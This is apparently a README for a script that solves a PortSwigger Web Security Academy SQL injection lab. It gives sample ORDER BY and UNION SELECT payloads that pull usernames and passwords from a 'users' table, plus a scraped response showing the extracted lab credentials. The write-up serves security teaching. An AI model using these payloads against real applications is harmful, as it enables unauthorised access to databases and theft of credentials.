# 🔐 SQL injection UNION attack, retrieving data from other tables

This script is designed to test for basic SQL injection vulnerabilities in labs from PortSwigger's Web Security Academy Lab: [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#). It targets endpoints like `/filter?category=` and checks whether a given payload successfully bypasses input validation.

---

## 🚀 How It Works

The script performs the following steps:

1. **Disables SSL warnings** to avoid certificate issues with lab URLs.
2. **Sets up a proxy** (default: `127.0.0.1:8080`) for interception via tools like Burp Suite.
3. **Accepts two arguments**:
   - `url`: The base URL of the lab.
   - `table`: Name of a separate table that needs be used during UNION SQL Injection.
   - `columns`: A list of columns can be passed by the user separated by space.
4. **Constructs the full request URL** by appending the payload to `/filter?category=`.
5. **Sends the request** and use beautiful soup library to fetch the password for administrator
6. **Prints the result** indicating whether the injection was successful.

---

## 🧪 Sample Usage

```bash
python3 unionRetrieveFromOtherTable.py https://0aed00af03273e1580eb30a8009f0001.web-security-academy.net users username password
```

### ✅ Sample Output

```
(+) Targeting: https://0aed00af03273e1580eb30a8009f0001.web-security-academy.net
(+) Determining number of columns using ORDER BY...

    ➤ Testing payload: ' ORDER BY 1--
    ➤ Testing payload: ' ORDER BY 2--
    ➤ Testing payload: ' ORDER BY 3--

(✓) Found error at column 3, so total columns = 2

(+) Testing which of 2 columns accepts string data...

    ➤ Testing payload: ' UNION SELECT 'test123',null--

(✓) Column 1 accepts string data.

(+) Attempting to extract data from table 'users'...

    ➤ Final payload: ' UNION SELECT username,password FROM users--

(✓) Administrator credentials found:

    ➤ Username: administrator
    ➤ Password: arj0eaiquwuuo2bkibqk
```

---

## 📌 Lab-Specific Note

For this particular lab, the script checks whether the response contains the administrator password in a particular html tag using web scraping to determine success. You can modify this logic in the code to match other labs or contexts.

---

## 📦 Requirements

Install dependencies using:

```bash
pip install -r requirements.txt
```

---

## 📦 Walkthrough of the code
[Code Walkthrough](https://medium.com/@adhithyasivanesh/portswigger-web-security-academy-labs-sqli-lab-1-retrieving-hidden-data-fe40ea356d5d)

## Sample HTML response which was scrapped

```HTML
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=yh4tNzEh3CAooYNqTUAzN1lnEta5Ap2q; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 9012

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection UNION attack, retrieving data from other tables</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection UNION attack, retrieving data from other tables</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="ecoms-pageheader">
                        <h1>Gifts&apos; UNION SELECT username,password FROM users--</h1>
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a class="filter-category" href="/">All</a>
                        <a class="filter-category" href="/filter?category=Corporate+gifts">Corporate gifts</a>
                        <a class="filter-category" href="/filter?category=Gifts">Gifts</a>
                        <a class="filter-category" href="/filter?category=Lifestyle">Lifestyle</a>
                        <a class="filter-category" href="/filter?category=Pets">Pets</a>
                        <a class="filter-category" href="/filter?category=Tech+gifts">Tech gifts</a>
                    </section>
                    <table class="is-table-longdescription">
                        <tbody>
                        <tr>
                            <th>Snow Delivered To Your Door</th>
                            <td>By Steam Train Direct From The North Pole
We can deliver you the perfect Christmas gift of all. Imagine waking up to that white Christmas you have been dreaming of since you were a child.
Your snow will be loaded on to our exclusive snow train and transported across the globe in time for the big day. In a few simple steps, your snow will be ready to scatter in the areas of your choosing.
*Make sure you have an extra large freezer before delivery.
*Decant the liquid into small plastic tubs (there is some loss of molecular structure during transit).
*Allow 3 days for it to refreeze.*Chip away at each block until the ice resembles snowflakes.
*Scatter snow.
Yes! It really is that easy. You will be the envy of all your neighbors unless you let them in on the secret. We offer a 10% discount on future purchases for every referral we receive from you.
Snow isn&apos;t just for Christmas either, we deliver all year round, that&apos;s 365 days of the year. Remember to order before your existing snow melts, and allow 3 days to prepare the new batch to avoid disappointment.</td>
                        </tr>
                        <tr>
                            <th>carlos</th>
                            <td>cxetkzae0p42bwxwjpza</td>
                        </tr>
                        <tr>
                            <th>Couple&apos;s Umbrella</th>
                            <td>Do you love public displays of affection? Are you and your partner one of those insufferable couples that insist on making the rest of us feel nauseas? If you answered yes to one or both of these questions, you need the Couple&apos;s Umbrella. And possible therapy.
Not content being several yards apart, you and your significant other can dance around in the rain fully protected from the wet weather. To add insult to the rest of the public&apos;s injury, the umbrella only has one handle so you can be sure to hold hands whilst barging children and the elderly out of your way. Available in several romantic colours, the only tough decision will be what colour you want to demonstrate your over the top love in public.
Cover both you and your partner and make the rest of us look on in envy and disgust with the Couple&apos;s Umbrella.</td>
                        </tr>
                        <tr>
                            <th>wiener</th>
                            <td>97bbzbscsijhbmjf2a66</td>
                        </tr>
                        <tr>
                            <th>administrator</th>
                            <td>arj0eaiquwuuo2bkibqk</td>
                        </tr>
                        <tr>
                            <th>Conversation Controlling Lemon</th>
                            <td>Are you one of those people who opens their mouth only to discover you say the wrong thing? If this is you then the Conversation Controlling Lemon will change the way you socialize forever!
When you feel a comment coming on pop it in your mouth and wait for the acidity to kick in. Not only does the lemon render you speechless by being inserted into your mouth, but the juice will also keep you silent for at least another five minutes. This action will ensure the thought will have passed and you no longer feel the need to interject.
The lemon can be cut into pieces - make sure they are large enough to fill your mouth - on average you will have four single uses for the price shown, that&apos;s nothing an evening. If you&apos;re a real chatterbox you will save that money in drink and snacks, as you will be unable to consume the same amount as usual.
The Conversational Controlling Lemon is also available with gift wrapping and a personalized card, share with all your friends and family; mainly those who don&apos;t know when to keep quiet. At such a low price this is the perfect secret Santa gift. Remember, lemons aren&apos;t just for Christmas, they&apos;re for life; a quieter, more reasonable, and un-opinionated one.</td>
                        </tr>
                        <tr>
                            <th>High-End Gift Wrapping</th>
                            <td>We offer a completely unique gift wrapping experience - the gift that just keeps on giving. We can crochet any shape and size to order. We also collect worldwide, we do the hard work so you don&apos;t have to.
The gift is no longer the only surprise. Your friends and family will be delighted at our bespoke wrapping, each item 100% original, something that will be talked about for many years to come.
Due to the intricacy of this service, you must allow 3 months for your order to be completed. So. organization is paramount, no leaving shopping until the last minute if you want to take advantage of this fabulously wonderful new way to present your gifts.
Get in touch, tell us what you need to be wrapped, and we can give you an estimate within 24 hours. Let your funky originality extend to all areas of your life. We love every project we work on, so don&apos;t delay, give us a call today.</td>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```